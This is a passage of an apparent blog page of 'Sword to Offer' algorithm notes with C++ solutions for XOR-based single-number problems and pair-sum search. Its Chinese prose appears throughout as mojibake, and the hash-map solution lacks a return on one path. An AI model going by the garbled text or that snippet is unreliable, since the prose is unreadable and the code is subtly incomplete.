href="https://www.acwing.com/problem/content/69/">æ•°ç»„ä¸­åªå‡ºç°ä¸€æ¬¡çš„ä¸¤ä¸ªæ•°å­—â˜…</a></h2><p>ä¸€ä¸ªæ•´å‹æ•°ç»„é‡Œé™¤äº†ä¸¤ä¸ªæ•°å­—ä¹‹å¤–ï¼Œå…¶ä»–çš„æ•°å­—éƒ½å‡ºç°äº†ä¸¤æ¬¡ã€‚</p><p>è¯·å†™ç¨‹åºæ‰¾å‡ºè¿™ä¸¤ä¸ªåªå‡ºç°ä¸€æ¬¡çš„æ•°å­—ã€‚</p><p>ä½ å¯ä»¥å‡è®¾è¿™ä¸¤ä¸ªæ•°å­—ä¸€å®šå­˜åœ¨ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[1,2,3,3,4,4]è¾“å‡ºï¼š[1,2]</code></pre><h3 id="é¢˜è§£-11">é¢˜è§£</h3><blockquote><p>4ç§ä½è¿ç®—: &amp;ä¸ |æˆ– ^å¼‚æˆ– ~é</p></blockquote><p>æ€è·¯:</p><ul><li>å…ˆå°†æ‰€æœ‰å…ƒç´ å¼‚æˆ–èµ·æ¥, å¼‚æˆ–ç»“æœsumå°±ä¸ºè¿™2ä¸ªåªå‡ºç°1æ¬¡å…ƒç´ çš„å¼‚æˆ–</li><li>ç„¶åæ‰¾åˆ°sumä¸­æŸä¸€ä½ä¸º1, ç„¶åæ ¹æ®ç¬¬kä½æ˜¯å¦ä¸º1å°†æ•°ç»„åˆ†æˆä¸¤éƒ¨åˆ†<br>ç”±äºè¿™2ä¸ªåªå‡ºç°1æ¬¡çš„å…ƒç´ ä¼šè¢«åˆ†å¼€, è€Œå‡ºç°ä¸¤æ¬¡çš„å…ƒç´ å¿…å®šä¼šè¢«åˆ†åˆ°åŒä¸€éƒ¨åˆ†ä¸­<br>å› æ­¤è¿™ä¸¤éƒ¨åˆ†éƒ½æ»¡è¶³: åªæœ‰1ä¸ªå…ƒç´ å‡ºç°1æ¬¡, å…¶ä»–å…ƒç´ éƒ½å‡ºç°2æ¬¡</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findNumsAppearOnce</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) sum ^= x;</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!(sum &gt;&gt; k &amp; <span class="number">1</span>)) k++;</span><br><span class="line">    <span class="type">int</span> first = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) &#123;</span><br><span class="line">      <span class="keyword">if</span> (x &gt;&gt; k &amp; <span class="number">1</span>) first ^= x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;first, sum ^= first&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ•°ç»„ä¸­å”¯ä¸€åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—â˜…"><a href="https://www.acwing.com/problem/content/70/">æ•°ç»„ä¸­å”¯ä¸€åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—â˜…</a></h2><p>åœ¨ä¸€ä¸ªæ•°ç»„ä¸­é™¤äº†ä¸€ä¸ªæ•°å­—åªå‡ºç°ä¸€æ¬¡ä¹‹å¤–ï¼Œå…¶ä»–æ•°å­—éƒ½å‡ºç°äº†ä¸‰æ¬¡ã€‚</p><p>è¯·æ‰¾å‡ºé‚£ä¸ªåªå‡ºç°ä¸€æ¬¡çš„æ•°å­—ã€‚</p><p>ä½ å¯ä»¥å‡è®¾æ»¡è¶³æ¡ä»¶çš„æ•°å­—ä¸€å®šå­˜åœ¨ã€‚</p><p><strong>æ€è€ƒé¢˜ï¼š</strong></p><ul><li>å¦‚æœè¦æ±‚åªä½¿ç”¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> çš„æ—¶é—´å’Œé¢å¤– <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> çš„ç©ºé—´ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1500</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[1,1,1,2,2,2,3,4,4,4]è¾“å‡ºï¼š3</code></pre><h3 id="æ³•1-æŒ‰ä½ç»Ÿè®¡">æ³•1 æŒ‰ä½ç»Ÿè®¡</h3><p>ä¸€å…±32ä¸ªä½ï¼Œç»Ÿè®¡å“ªä¸ªä½ 1 å‡ºç°æ¬¡æ•° % 3 == 1ï¼Œé‚£ä¹ˆæ‰€æ±‚æ•°è¯¥ä½ä¸º1ï¼Œæœ€ååˆèµ·æ¥å°±æ˜¯ç­”æ¡ˆã€‚</p><p>æ—¶é—´å¤æ‚åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>32</mn><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(32n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">32</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br>å› ä¸º n ä¸€èˆ¬åœ¨ç™¾ä¸‡çº§åˆ«ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo>&lt;</mo><mn>32</mn></mrow><annotation encoding="application/x-tex">logn&lt;32</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">32</span></span></span></span>ï¼Œæ‰€ä»¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>32</mn><mi>n</mi><mo>&gt;</mo><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">32n&gt;nlogn</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">32</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span></span></span></span> ï¼Œä¸æ˜¯ä¸¥æ ¼çš„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">findNumberAppearingOnce</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; i++) &#123;</span><br><span class="line">      <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) &#123;</span><br><span class="line">        <span class="keyword">if</span> (x &gt;&gt; i &amp; <span class="number">1</span>) cnt++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (cnt % <span class="number">3</span>) &#123;</span><br><span class="line">        res |= <span class="number">1</span> &lt;&lt; i;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ³•2-çŠ¶æ€æœº">æ³•2 çŠ¶æ€æœº</h3><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221223210809129.png" alt></p><p>æ ¹æ®ä¸‹é¢ä»£ç å¯ä»¥ç”»å‡ºä¸Šé¢çš„çŠ¶æ€æœºè¿›è¡ŒéªŒè¯ã€‚</p><p>æ¨å¯¼æ˜¯æ ¹æ®çœŸå€¼è¡¨æ¨å¯¼å‡ºçŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼Œå¯å‚è€ƒï¼š<a href="https://www.acwing.com/solution/content/19076/">https://www.acwing.com/solution/content/19076/</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">findNumberAppearingOnce</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ones = <span class="number">0</span>, twos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) &#123;</span><br><span class="line">      ones = (ones ^ x) &amp; ~twos;</span><br><span class="line">      twos = (twos ^ x) &amp; ~ones;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ones;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å’Œä¸ºSçš„ä¸¤ä¸ªæ•°å­—"><a href="https://www.acwing.com/problem/content/71/">å’Œä¸ºSçš„ä¸¤ä¸ªæ•°å­—</a></h2><p>è¾“å…¥ä¸€ä¸ªæ•°ç»„å’Œä¸€ä¸ªæ•°å­— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span>ï¼Œåœ¨æ•°ç»„ä¸­æŸ¥æ‰¾ä¸¤ä¸ªæ•°ï¼Œä½¿å¾—å®ƒä»¬çš„å’Œæ­£å¥½æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span>ã€‚</p><p>å¦‚æœæœ‰å¤šå¯¹æ•°å­—çš„å’Œç­‰äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span>ï¼Œè¾“å‡ºä»»æ„ä¸€å¯¹å³å¯ã€‚</p><p>ä½ å¯ä»¥è®¤ä¸ºæ¯ç»„è¾“å…¥ä¸­éƒ½è‡³å°‘å«æœ‰ä¸€ç»„æ»¡è¶³æ¡ä»¶çš„è¾“å‡ºã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1002</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1002]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1002</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[1,2,3,4] , sum=7è¾“å‡ºï¼š[3,4]</code></pre><h2 id="æ³•1-åŒæŒ‡é’ˆ">æ³•1 åŒæŒ‡é’ˆ</h2><p>æ—¶é—´å¤æ‚åº¦ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>ç©ºé—´å¤æ‚åº¦ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findNumbersWithSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nums[i] + nums[j] &lt; target) &#123;</span><br><span class="line">        i++;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] + nums[j] &gt; target) &#123;</span><br><span class="line">        j--;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;nums[i], nums[j]&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ³•2-hashè¡¨å¿«é€ŸæŸ¥æ‰¾">æ³•2 hashè¡¨å¿«é€ŸæŸ¥æ‰¾</h3><p>æ—¶é—´å¤æ‚åº¦ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>ç©ºé—´å¤æ‚åº¦ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findNumbersWithSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; hash;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!hash[target - x]) &#123;</span><br><span class="line">        hash[x]++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(&#123;x, target - x&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å’Œä¸ºSçš„è¿ç»­æ­£æ•°åºåˆ—"><a href="https://www.acwing.com/problem/content/72/">å’Œä¸ºSçš„è¿ç»­æ­£æ•°åºåˆ—</a></h2><p>è¾“å…¥ä¸€ä¸ªéè´Ÿæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>ï¼Œæ‰“å°å‡ºæ‰€æœ‰å’Œä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> çš„è¿ç»­æ­£æ•°åºåˆ—ï¼ˆè‡³å°‘å«æœ‰ä¸¤ä¸ªæ•°ï¼‰ã€‚</p><p>ä¾‹å¦‚è¾“å…¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>15</mn></mrow><annotation encoding="application/x-tex">15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">15</span></span></span></span>ï¼Œç”±äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>+</mo><mn>2</mn><mo>+</mo><mn>3</mn><mo>+</mo><mn>4</mn><mo>+</mo><mn>5</mn><mo>=</mo><mn>4</mn><mo>+</mo><mn>5</mn><mo>+</mo><mn>6</mn><mo>=</mo><mn>7</mn><mo>+</mo><mn>8</mn><mo>=</mo><mn>15</mn></mrow><annotation encoding="application/x-tex">1+2+3+4+5=4+5+6=7+8=15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">15</span></span></span></span>ï¼Œæ‰€ä»¥ç»“æœæ‰“å°å‡º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> ä¸ªè¿ç»­åºåˆ— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>âˆ¼</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">1 \sim 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span>ã€<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>âˆ¼</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">4 \sim 6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn><mo>âˆ¼</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">7 \sim 8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span></span></span></span>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>â‰¤</mo><mi>S</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0 \le S \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span 